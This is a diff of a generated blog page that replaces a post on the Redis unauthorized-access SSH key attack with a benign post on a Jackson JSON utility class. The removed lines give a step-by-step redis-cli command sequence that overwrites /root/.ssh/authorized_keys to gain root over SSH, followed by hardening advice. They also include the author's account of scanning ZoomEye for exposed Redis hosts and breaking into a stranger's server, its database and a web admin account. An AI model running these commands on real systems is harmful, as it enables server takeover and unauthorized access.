@@ -68,7 +68,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Redis,SSH,漏洞,攻击," />
+  <meta name="keywords" content="json,序列化,反序列化," />
 
 
 
@@ -84,24 +84,22 @@
 
 
 
-<meta name="description" content="在没有安全防范的情况下使用Redis“漏洞”可以将本机SSH的id_rsa.pub写入到目标机器/root/.ssh/authorize_keys文件中，从而获取目标机器的免登录root权限，而这对于目标机器来说，无疑是一种灾难
+<meta name="description" content="Json是一种常用的文本数据交换格式，对象到Json的序列化以及Json到对象的反序列化经常被使用在日常的开发之中，有一个工具类的话可以简化开发工作，避免写很多异常捕获代码。我写了一个简单的范型工具类，虽然简单，但用起来倒很方便。
 
-被攻击阿里云使用Redis的默认配置启动服务，没有设置密码，为了方便远程连接，服务器防火墙开了Redis默认的6379端口以及SSH的22端口，并且没有限制访问IP。">
+1234567891011121314151617181920212223242526272829303132333435363738394041424344454">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Redis“漏洞”，SSH免登录攻击">
-<meta property="og:url" content="http://chenchi.me/2016/08/18/Redis“漏洞”，SSH免登录攻击/index.html">
+<meta property="og:title" content="Jackson序列化、反序列化工具类">
+<meta property="og:url" content="http://chenchi.me/2016/09/02/Jackson序列化、反序列化工具类/index.html">
 <meta property="og:site_name" content="ccincd's blog">
-<meta property="og:description" content="在没有安全防范的情况下使用Redis“漏洞”可以将本机SSH的id_rsa.pub写入到目标机器/root/.ssh/authorize_keys文件中，从而获取目标机器的免登录root权限，而这对于目标机器来说，无疑是一种灾难
+<meta property="og:description" content="Json是一种常用的文本数据交换格式，对象到Json的序列化以及Json到对象的反序列化经常被使用在日常的开发之中，有一个工具类的话可以简化开发工作，避免写很多异常捕获代码。我写了一个简单的范型工具类，虽然简单，但用起来倒很方便。
 
-被攻击阿里云使用Redis的默认配置启动服务，没有设置密码，为了方便远程连接，服务器防火墙开了Redis默认的6379端口以及SSH的22端口，并且没有限制访问IP。">
-<meta property="og:image" content="http://oax5iq75d.bkt.clouddn.com/%E5%9B%BE1.png">
-<meta property="og:updated_time" content="2016-08-18T15:45:44.000Z">
+1234567891011121314151617181920212223242526272829303132333435363738394041424344454">
+<meta property="og:updated_time" content="2016-09-02T15:27:20.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Redis“漏洞”，SSH免登录攻击">
-<meta name="twitter:description" content="在没有安全防范的情况下使用Redis“漏洞”可以将本机SSH的id_rsa.pub写入到目标机器/root/.ssh/authorize_keys文件中，从而获取目标机器的免登录root权限，而这对于目标机器来说，无疑是一种灾难
+<meta name="twitter:title" content="Jackson序列化、反序列化工具类">
+<meta name="twitter:description" content="Json是一种常用的文本数据交换格式，对象到Json的序列化以及Json到对象的反序列化经常被使用在日常的开发之中，有一个工具类的话可以简化开发工作，避免写很多异常捕获代码。我写了一个简单的范型工具类，虽然简单，但用起来倒很方便。
 
-被攻击阿里云使用Redis的默认配置启动服务，没有设置密码，为了方便远程连接，服务器防火墙开了Redis默认的6379端口以及SSH的22端口，并且没有限制访问IP。">
-<meta name="twitter:image" content="http://oax5iq75d.bkt.clouddn.com/%E5%9B%BE1.png">
+1234567891011121314151617181920212223242526272829303132333435363738394041424344454">
 
 
 
@@ -122,9 +120,9 @@
 
 
 
-  <link rel="canonical" href="http://chenchi.me/2016/08/18/Redis“漏洞”，SSH免登录攻击/"/>
+  <link rel="canonical" href="http://chenchi.me/2016/09/02/Jackson序列化、反序列化工具类/"/>
 
-  <title> Redis“漏洞”，SSH免登录攻击 | ccincd's blog </title>
+  <title> Jackson序列化、反序列化工具类 | ccincd's blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -274,7 +272,7 @@
             
             
               
-                Redis“漏洞”，SSH免登录攻击
+                Jackson序列化、反序列化工具类
               
             
           </h1>
@@ -286,8 +284,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-08-18T21:43:48+08:00" content="2016-08-18">
-              2016-08-18
+            <time itemprop="dateCreated" datetime="2016-09-02T22:34:26+08:00" content="2016-09-02">
+              2016-09-02
             </time>
           </span>
 
@@ -316,8 +314,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/08/18/Redis“漏洞”，SSH免登录攻击/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/08/18/Redis“漏洞”，SSH免登录攻击/" itemprop="commentsCount"></span>
+                <a href="/2016/09/02/Jackson序列化、反序列化工具类/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/09/02/Jackson序列化、反序列化工具类/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -341,39 +339,19 @@
 
       
         <blockquote>
-<p><em>在没有安全防范的情况下使用Redis“漏洞”可以将本机SSH的id_rsa.pub写入到目标机器/root/.ssh/authorize_keys文件中，从而获取目标机器的免登录root权限，而这对于目标机器来说，无疑是一种灾难</em></p>
+<p>Json是一种常用的文本数据交换格式，对象到Json的序列化以及Json到对象的反序列化经常被使用在日常的开发之中，有一个工具类的话可以简化开发工作，避免写很多异常捕获代码。我写了一个简单的范型工具类，虽然简单，但用起来倒很方便。</p>
 </blockquote>
-<h3 id="被攻击"><a href="#被攻击" class="headerlink" title="被攻击"></a>被攻击</h3><p>阿里云使用Redis的默认配置启动服务，没有设置密码，为了方便远程连接，服务器防火墙开了Redis默认的6379端口以及SSH的22端口，并且没有限制访问IP。这样做相当于把Redis暴露到公网，攻击者可以查询、修改Redis数据，甚至关闭、破坏Redis服务，考虑到目前Redis存储从数据量和重要性上需求都不大，所以并没有引起我对安全的重视。</p>
-<p>最近发现之前配置的SSH免登录失效了，/root/.ssh/authorized_keys文件里面出现了类似于乱码的内容，如图1所示：</p>
-<p><img src="http://oax5iq75d.bkt.clouddn.com/%E5%9B%BE1.png" alt="图1"></p>
-<p>一开始并没有注意到文件开头的REDIS0006字样，以为是乱码，于是把内容清空了，并将自己的id_rsa.pub重新放入其中，但没过多久，文件又恢复了原样，并且有服务器被异地登录的异常。我试着搜了下REDIS0006，因此了解到这并不是简简单单的猜测到或者暴力破解到root密码的问题。</p>
-<h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>Redis服务暴露到公网，没有设置密码和其它安全策略，并且使用root权限启动，那么攻击者可以使用config命令将redis的dbfile设置为/root/.ssh下的authorized_keys，虽然名字与Linux系统的授权文件相同，但实际上是偷梁换柱，将Redis的数据库文件设置到.ssh文件夹下并覆盖原授权文件。</p>
-<p>因为攻击者拥有Redis的读写权限，因而可以将自己本机的id_rsa.pub伪装成Redis值的方式写入到authorized_keys文件中，从而实现SSH免登录，并且由于授权文件位于/root下，因而获得了root权限。</p>
-<p><span id="jump"></span></p>
-<h3 id="攻击复现"><a href="#攻击复现" class="headerlink" title="攻击复现"></a>攻击复现</h3><blockquote>
-<p>假定目标机器ip为12.34.56.78</p>
-</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> me.chenchi.json.util</div><div class="line"></div><div class="line"><span class="keyword">import</span> com.google.common.base.Splitter;</div><div class="line"><span class="keyword">import</span> com.google.common.collect.Lists;</div><div class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</div><div class="line"><span class="keyword">import</span> org.codehaus.jackson.map.ObjectMapper;</div><div class="line"><span class="keyword">import</span> org.codehaus.jackson.map.annotate.JsonSerialize;</div><div class="line"><span class="keyword">import</span> org.codehaus.jackson.type.TypeReference;</div><div class="line"><span class="keyword">import</span> org.slf4j.Logger;</div><div class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</div><div class="line"></div><div class="line"><span class="keyword">import</span> java.io.IOException;</div><div class="line"><span class="keyword">import</span> java.util.List;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> * Json工具类</div><div class="line"> *</div><div class="line"> * Created by cc on 16/6/19.</div><div class="line"> */</div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JsonUtils</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOG = LoggerFactory.getLogger(JsonUtils.class);</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="title">JsonUtils</span><span class="params">()</span> </span>&#123;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">jsonToObject</span><span class="params">(String str, TypeReference&lt;T&gt; typeRef)</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span> (StringUtils.isEmpty(str)) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        T result;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            ObjectMapper objectMapper = <span class="keyword">new</span> ObjectMapper();</div><div class="line">            result = objectMapper.readValue(str, typeRef);</div><div class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</div><div class="line">            LOG.error(<span class="string">"JSON反序列化异常，str=&#123;&#125;"</span>, str, e);</div><div class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> result;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">objectToJson</span><span class="params">(Object obj)</span> </span>&#123;</div><div class="line">        String result;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            ObjectMapper objectMapper = <span class="keyword">new</span> ObjectMapper();</div><div class="line">            result = objectMapper.writeValueAsString(obj);</div><div class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</div><div class="line">            LOG.error(<span class="string">"JSON序列化异常，obj=&#123;&#125;"</span>, obj);</div><div class="line">            <span class="keyword">return</span> StringUtils.EMPTY;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> result;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">objectToJsonIgnoreNull</span><span class="params">(Object obj)</span> </span>&#123;</div><div class="line">        String result;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            ObjectMapper objectMapper = <span class="keyword">new</span> ObjectMapper();</div><div class="line">            objectMapper.setSerializationInclusion(JsonSerialize.Inclusion.NON_NULL);</div><div class="line">            result = objectMapper.writeValueAsString(obj);</div><div class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</div><div class="line">            LOG.error(<span class="string">"JSON序列化异常，obj=&#123;&#125;"</span>, obj);</div><div class="line">            <span class="keyword">return</span> StringUtils.EMPTY;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> result;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>✔️<b>其中有两点值得说一下：</b></p>
 <ol>
-<li><p>本地生成SSH公钥和私钥：ssh-keygen -t rsa -C “yourname@youremail.com”</p>
-</li>
-<li><p>依次执行命令：</p>
- <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">// 将SSH公钥存入文件，加\n\n是为了匹配Redis的存储格式</div><div class="line">1. (<span class="built_in">echo</span> <span class="_">-e</span> <span class="string">"\n\n"</span>; cat id_rsa.pub; <span class="built_in">echo</span> <span class="_">-e</span> <span class="string">"\n\n"</span>) &gt; foo.txt</div><div class="line">// 连接目标服务器的Redis，并设置键foo的值为上一条命令的内容</div><div class="line">2. cat foo.txt | redis-cli -h 12.34.56.78 -x <span class="built_in">set</span> foo</div><div class="line">// 登录目标服务器的Redis</div><div class="line">3. redis-cli -h 12.34.56.78</div><div class="line">// 使用config命令将Redis的工作目录切换到/root/.ssh/下</div><div class="line">4. config <span class="built_in">set</span> dir /root/.ssh/</div><div class="line">// 设置Redis的数据存储文件为authorized_keys</div><div class="line">5. config <span class="built_in">set</span> dbfilename authorized_keys</div><div class="line">// 将Redis数据，也即键foo的值写入文件中</div><div class="line">6. save</div><div class="line">// 免密码登录目标主机，并获取root权限</div><div class="line">7. ssh root@12.34.56.78</div></pre></td></tr></table></figure>
-</li>
+<li>jsonToObject静态方法的第二个参数使用了<code>TypeReference&lt;T&gt;</code>，原因在于Java的字节码文件中并没有类型信息（范型擦除）。在用objectMapper.readValue进行反序列化时，第二个参数需要传入反序列化对象的Class，如果传<code>List&lt;MyObject&gt;.class</code>，则字节码文件中的类型只是List，ObjectMapper由于不知道具体的类型，因而反序列化出来的对象并非是我们需要的。</li>
+<li>objectToJsonIgnoreNull静态方法可以在序列化的时候忽略值为null的对象字段，这样做可以缩短序列化出的Json串，一来可以减少存储空间，二来可以在网络发送中减少无用的信息。</li>
 </ol>
-<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><blockquote>
-<p>以下解决方案并非要全部实现，但使用的越多，系统会越安全</p>
-</blockquote>
+<p>⚠️<b>需要注意的地方：</b></p>
 <ol>
-<li>bind IP地址为127.0.0.1，而非使用默认的0.0.0.0</li>
-<li>设置Redis密码</li>
-<li>将config命令重命名为一串不易猜到的内容，如rename-command config “d901das8dhwq98sadwq9”</li>
-<li>不使用root启动Redis服务</li>
-<li>不使用默认的6379端口，或在防火墙中屏蔽掉Redis的对外接口，或配置IP访问规则，或者直接禁用掉SSH使用的22端口</li>
+<li>序列化和反序列化失败的时候<font color="red">吞了异常</font>，只打印出了一条日志并返回null。如果业务需要抛出异常信息可以抛出自定义的非受检异常，或以Illegal开头的系统非受检异常。</li>
+<li>入参为空时同样返回null，如果需要抛出异常，可更改相应代码。</li>
 </ol>
-<h3 id="攻击演练"><a href="#攻击演练" class="headerlink" title="攻击演练"></a>攻击演练</h3><p>在<a href="https://www.zoomeye.org/" target="_blank" rel="external">ZoomEye</a>上搜<a href="https://www.zoomeye.org/search?q=port%3A6379&amp;t=host" target="_blank" rel="external">port:6379</a>，找到宿主机运行Linux系统并且没有设置密码校验的机器IP，按照<a href="#jump">步骤3</a>的攻击方式，手动（真正的黑客一般不会这么玩）进行演练，约一个小时的时间才成功登录一台机器，虽然效率比较低，但获取那台机器的root权限之后我又以root身份登录了MySQL数据库，并且破解了Web应用的管理员账号，如果想要摧毁服务和系统，不费吹灰之力，当然我肯定不会这么做，因为我不是一个破坏者。</p>
-<p>从上述演练可以看出来，被获取root权限的结果是多么的可怕，😱，身为一名开发人员，也应当有一定的安全意识，不然如果遇到互联网世界里的“坏人”，想要挽回损失就追悔莫及了。</p>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://blog.jobbole.com/94518/" target="_blank" rel="external">Redis 未授权访问缺陷可轻易导致系统被黑</a></p>
-<p><a href="http://blog.csdn.net/whs_321/article/details/51734602" target="_blank" rel="external">记录一次攻击事件(redis 未授权漏洞利用直接登录服务器)</a></p>
 
       
     </div>
@@ -396,13 +374,11 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Redis/" rel="tag">#Redis</a>
+            <a href="/tags/json/" rel="tag">#json</a>
           
-            <a href="/tags/SSH/" rel="tag">#SSH</a>
+            <a href="/tags/序列化/" rel="tag">#序列化</a>
           
-            <a href="/tags/漏洞/" rel="tag">#漏洞</a>
-          
-            <a href="/tags/攻击/" rel="tag">#攻击</a>
+            <a href="/tags/反序列化/" rel="tag">#反序列化</a>
           
         </div>
       
@@ -411,17 +387,13 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/08/09/好的编码习惯/" rel="next" title="好的编码习惯">
-                <i class="fa fa-chevron-left"></i> 好的编码习惯
+              <a href="/2016/09/01/SpringMVC使用Dubbo和Zookeeper的例子/" rel="next" title="SpringMVC使用Dubbo和Zookeeper的例子">
+                <i class="fa fa-chevron-left"></i> SpringMVC使用Dubbo和Zookeeper的例子
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/08/21/Linux调整-root硬盘空间/" rel="prev" title="Linux调整/root硬盘空间">
-                Linux调整/root硬盘空间 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -436,10 +408,10 @@
 
     <div class="post-spread">
       
-        <div class="ds-share flat" data-thread-key="2016/08/18/Redis“漏洞”，SSH免登录攻击/"
-     data-title="Redis“漏洞”，SSH免登录攻击"
+        <div class="ds-share flat" data-thread-key="2016/09/02/Jackson序列化、反序列化工具类/"
+     data-title="Jackson序列化、反序列化工具类"
      data-content=""
-     data-url="http://chenchi.me/2016/08/18/Redis“漏洞”，SSH免登录攻击/">
+     data-url="http://chenchi.me/2016/09/02/Jackson序列化、反序列化工具类/">
   <div class="ds-share-inline">
     <ul  class="ds-share-icons-16">
 
@@ -466,8 +438,8 @@
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2016/08/18/Redis“漏洞”，SSH免登录攻击/"
-           data-title="Redis“漏洞”，SSH免登录攻击" data-url="http://chenchi.me/2016/08/18/Redis“漏洞”，SSH免登录攻击/">
+      <div class="ds-thread" data-thread-key="2016/09/02/Jackson序列化、反序列化工具类/"
+           data-title="Jackson序列化、反序列化工具类" data-url="http://chenchi.me/2016/09/02/Jackson序列化、反序列化工具类/">
       </div>
     
   </div>
@@ -558,7 +530,7 @@
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#被攻击"><span class="nav-number">1.</span> <span class="nav-text">被攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞介绍"><span class="nav-number">2.</span> <span class="nav-text">漏洞介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击复现"><span class="nav-number">3.</span> <span class="nav-text">攻击复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解决方案"><span class="nav-number">4.</span> <span class="nav-text">解决方案</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击演练"><span class="nav-number">5.</span> <span class="nav-text">攻击演练</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol></div>
+              <p class="post-toc-empty">此文章未包含目录</p>
             
           </div>
         </section>
